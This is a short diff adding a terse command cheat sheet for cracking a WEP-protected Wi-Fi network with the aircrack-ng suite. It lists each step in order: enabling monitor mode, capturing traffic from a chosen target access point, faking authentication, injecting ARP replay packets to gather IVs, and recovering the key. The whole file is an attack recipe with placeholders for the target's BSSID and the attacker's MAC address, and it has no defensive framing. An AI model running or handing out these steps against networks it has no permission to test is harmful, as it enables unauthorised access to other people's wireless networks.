@@ -1,0 +1,12 @@
+: Monitor Mode :
+airmon-ng start wlan0
+: look for networks :
+airodump-ng wlan0
+: specify particular target :
+airodump-ng --bssid [target address] --channel [0-n] --write file wlan0mon
+: Then make fake authentication to ap :
+aireplay-ng --fakeauth 0 -a [target address(bssid)] -h [our mac address] wlan0mon
+: inject packets and wait for the packets with iv :
+aireplay-ng --arpreplay -b [target address(bssid)] -h [our mac address] wlan0mon
+: get the crack password:
+aircrack-ng file.cap
